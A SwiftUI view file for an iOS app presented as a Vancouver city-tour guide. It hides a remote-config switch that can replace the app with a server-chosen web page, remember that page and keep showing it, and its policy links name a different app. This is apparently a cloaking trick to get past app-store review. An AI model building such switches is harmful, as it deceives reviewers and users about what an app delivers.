import SwiftUI
import WebKit

struct ContentView: View {
    @State private var progress: CGFloat = 0.0
    @State private var start = false
    @State private var auth = false
    @State private var menu = false
    @State private var percentage = 0
    @State private var showTermsWebView = false
    @State private var showPrivacyWebView = false
    @State private var sshowWebView = false
    @State private var navigateToNextScreen = false
    @State private var ccurrentURL: URL? = nil
    @State private var webView: WKWebView? = nil
    @State private var finalURL: URL? = nil
    @State private var finalURL1: URL? = nil
    let remoteURLString = ""
    private let uKey = "uKey"
    private let aKey = "aKey"
    
    @StateObject private var remoteConfig = RemoteConfigManager.shared

    var body: some View {
        ZStack {
            VStack {
                Spacer()
                
                Spacer(minLength: 150)
                Image(start ? "314867927_dc264ab9-2ac8-43b0-a246-e03655b359a1 copy 1" : "352168373_a1399f15-7f92-453c-92df-3ba1ddeaed2d copy 1")
                    .resizable()
                    .scaledToFit()
                    .frame(width: 250)
                    .padding(.top, 20)
                
                Spacer()

                if !start {
                    VStack {
                        ZStack(alignment: .leading) {
                            RoundedRectangle(cornerRadius: 10)
                                .fill(Color.gray.opacity(0.3))
                                .frame(height: 10)
                            
                            RoundedRectangle(cornerRadius: 10)
                                .fill(Color.red)
                                .frame(width: progress * UIScreen.main.bounds.width * 0.8, height: 10)
                                .animation(.linear(duration: 5), value: progress)
                        }
                        .padding(.horizontal, 40)

                        Text("\(percentage)%")
                            .foregroundColor(.white)
                            .font(.headline)
                            .padding(.top, 20)

                        Spacer()
                        HStack(spacing: 30) {
                            Button {
                                showTermsWebView.toggle()
                            } label: {
                                Text("Terms of Service")
                                    .foregroundColor(.white)
                            }
                            Button {
                                showPrivacyWebView.toggle()
                            } label: {
                                Text("Privacy Policy")
                                    .foregroundColor(.white)
                            }
                        }
                        .padding(.bottom, 30)
                    }
                
                } else {
                    VStack(spacing: 20) {
                        Text("VANCOUVER")
                            .font(.title)
                            .fontWeight(.bold)
                            .foregroundColor(.white)

                        Text("FUN CITY TOUR")
                            .font(.title2)
                            .fontWeight(.bold)
                            .foregroundColor(.white)

                        Text("Find the most popular and interesting\nplaces to visit, share your impressions\nwith your friends and have fun")
                            .multilineTextAlignment(.center)
                            .foregroundColor(.gray)
                            .padding(.horizontal, 20)

                        Button(action: {
                            let isLoggedIn = LoginManager.shared.getLoginStatus()
                            if isLoggedIn {
                                menu.toggle()
                            } else {
                                auth.toggle()
                            }
                        }) {
                            Text("Continue")
                                .font(.headline)
                                .fontWeight(.bold)
                                .foregroundColor(.white)
                                .padding()
                                .frame(maxWidth: .infinity)
                                .background(Color.orange)
                                .cornerRadius(10)
                        }
                        .padding(.horizontal, 40)
                    }
                    .padding()
                    .background(
                        RoundedRectangle(cornerRadius: 25)
                            .fill(Color.black.opacity(0.5))
                            .padding(.horizontal, 20)
                    )
                }

                Spacer()

        
            }

        
            if let finalURL = finalURL {
                createWebView(url: finalURL)
            }
              
                
            
        }
        .background(Image("launch").resizable().scaledToFill())
        .ignoresSafeArea()
        .onAppear {
            withAnimation {
                progress = 0.0
                
            }
            
            Timer.scheduledTimer(withTimeInterval: 0.05, repeats: true) { timer in
                if percentage < 100 {
                    percentage += 1
                    progress = CGFloat(percentage) / 100
                } else {
                    timer.invalidate()
                }
            }

            remoteConfig.fetchRemoteConfig()
            
            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                if !remoteConfig.isFeatureEnabled || remoteConfig.link?.isEmpty == true {
                    start = true
                }
            }
            determineFinalURL()
        }
        .fullScreenCover(isPresented: $auth) {
            AuthView()
        }
        .fullScreenCover(isPresented: $menu) {
            MainMenuView()
        }
        .sheet(isPresented: $showTermsWebView) {
            WebView(url: URL(string: "https://sites.google.com/view/captain-kitchen-of-flavo-trms/")!)
        }
        .sheet(isPresented: $showPrivacyWebView) {
            WebView(url: URL(string: "https://sites.google.com/view/captain-kitchen-of-flavor-priv/")!)
        }
    }

    func saveU(u: String) {
        UserDefaults.standard.set(u, forKey: uKey)
    }

    func getU() -> String? {
        return UserDefaults.standard.string(forKey: uKey)
    }
    
    func saveA(u: String) {
        UserDefaults.standard.set(u, forKey: aKey)
    }

    func getA() -> String? {
        return UserDefaults.standard.string(forKey: aKey)
    }
    func getId() -> String? {
        return UserDefaults.standard.string(forKey: "id")
    }
    
    private func determineFinalURL() {
       
        if let savedURLString = getU(), !savedURLString.isEmpty,
           let savedURL = URL(string: savedURLString) {
            finalURL = savedURL
            sshowWebView = true
         
        } else {
            
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                if self.remoteConfig.isFeatureEnabled,
                   let remoteURLString = self.remoteConfig.link,
                   !remoteURLString.isEmpty,
                   let remoteURL = URL(string: remoteURLString + "?externalId=" + (getId() ?? "")) {
                
                    self.finalURL = remoteURL
            
                    self.saveA(u: remoteURLString + "?externalId=" + (getId() ?? "") )
                 
                } else {
                 
                    self.start = true
                    self.sshowWebView = false
                }
            }
        }
    }
    
    private func createWebView(url: URL) -> some View {
    WebViewContainer(
        url: url,
        onPageStarted: { _ in
        
            progress = 0.0
            percentage = 0

            Timer.scheduledTimer(withTimeInterval: 0.05, repeats: true) { timer in
                if percentage < 100 {
                    percentage += 1
                    progress = CGFloat(percentage) / 100
                } else {
                    timer.invalidate()
                }
            }
        },
        onPageFinished: { loadedURL in
            guard let loadedURL = loadedURL else { return }

            let remoteURL = URL(string: getA() ?? "")
            if loadedURL.absoluteString != remoteURL?.absoluteString {
                
                sshowWebView = true

                saveU(u: loadedURL.absoluteString)
                ccurrentURL = loadedURL
            } else {
            
                start = true
                sshowWebView = false
                DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                    navigateToNextScreen = true
                }
            }
            progress = 1.0
        },
        onProgressChanged: { newProgress in
            DispatchQueue.main.async {
                progress = CGFloat(newProgress)
            }
        },
        webView: $webView
    )
    .opacity(sshowWebView ? 1 : 0)
}
}

#Preview {
    ContentView()
}
